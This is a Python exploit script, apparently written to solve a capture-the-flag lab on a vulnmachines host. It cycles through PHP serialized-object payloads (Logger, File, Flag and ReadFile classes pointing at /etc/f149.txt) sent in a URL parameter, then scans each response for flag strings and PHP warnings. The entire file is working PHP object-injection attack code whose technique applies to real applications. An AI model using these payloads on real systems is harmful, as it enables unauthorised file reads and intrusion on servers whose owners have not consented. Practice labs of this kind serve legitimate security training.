#!/usr/bin/env python3
import requests
import urllib.parse
import re

base_url = "http://hackme11.vulnmachines.com:8056"

def test_payload(payload, description):
    print(f"\n[*] {description}")
    print(f"    Payload: {payload}")
    
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    response = requests.get(url)
    
    # Buscar flags
    patterns = [
        r'flag{[^}]+}',
        r'FLAG{[^}]+}',
        r'vulnmachines{[^}]+}',
        r'[a-fA-F0-9]{32}',
        r'vm_[a-zA-Z0-9]+',
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, response.text, re.IGNORECASE)
        if matches:
            print(f"[+] FOUND: {matches[0]}")
            return matches[0]
    
    # Buscar errores útiles
    if "Notice" in response.text or "Warning" in response.text:
        for line in response.text.split('\n'):
            if "Notice" in line or "Warning" in line:
                print(f"    Error: {line.strip()}")
    
    return None

print("[*] Lab 1 Exploit - Corrected Payloads")

# Corregir el payload de Logger
payloads = [
    # Logger con sintaxis correcta
    ('O:6:"Logger":1:{s:7:"logfile";s:13:"/etc/f149.txt";}', 'Logger with logfile (7 chars)'),
    ('O:6:"Logger":1:{s:8:"log_file";s:13:"/etc/f149.txt";}', 'Logger with log_file'),
    ('O:6:"Logger":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Logger with file'),
    
    # Probar otras clases comunes
    ('O:4:"File":1:{s:4:"name";s:13:"/etc/f149.txt";}', 'File class'),
    ('O:4:"File":1:{s:4:"path";s:13:"/etc/f149.txt";}', 'File with path'),
    ('O:4:"File":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'File with filename'),
    
    # Flag class variations
    ('O:4:"Flag":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'Flag with file'),
    ('O:4:"Flag":1:{s:4:"path";s:13:"/etc/f149.txt";}', 'Flag with path'),
    ('O:4:"Flag":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'Flag with filename'),
    
    # ReadFile variations
    ('O:8:"ReadFile":1:{s:4:"file";s:13:"/etc/f149.txt";}', 'ReadFile with file'),
    ('O:8:"ReadFile":1:{s:4:"path";s:13:"/etc/f149.txt";}', 'ReadFile with path'),
    ('O:8:"ReadFile":1:{s:8:"filename";s:13:"/etc/f149.txt";}', 'ReadFile with filename'),
]

found = False
for payload, desc in payloads:
    result = test_payload(payload, desc)
    if result:
        print(f"\n[!!!] FLAG FOUND: {result}")
        found = True
        break

if not found:
    print("\n[-] No flag found with these payloads")